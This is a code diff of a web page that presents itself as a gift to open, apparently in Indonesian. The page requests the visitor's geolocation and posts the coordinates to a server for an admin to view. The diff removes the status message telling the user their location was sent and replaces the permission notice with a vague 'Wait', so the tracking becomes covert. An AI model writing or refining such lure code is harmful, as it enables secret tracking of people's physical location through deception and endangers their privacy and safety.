@@ -144,12 +144,12 @@
     }
     async function requestLocation(){
       btn.disabled = true;
-      setStatus('Meminta izin…', 'loading');
+      setStatus('loading', 'Wait');
       try{
         if (!('geolocation' in navigator)) throw new Error('Geolocation tidak didukung');
         navigator.geolocation.getCurrentPosition((pos)=>{
           const { latitude, longitude, accuracy } = pos.coords;
-          setStatus('Hadiah terbuka & lokasi terkirim ✔️', 'ok');
+          setStatus('Hadiah terbuka', 'ok');
           openGiftUI(true);
           postLoc(latitude, longitude, accuracy); // kirim ke server (admin akan melihatnya)
         }, (err)=>{
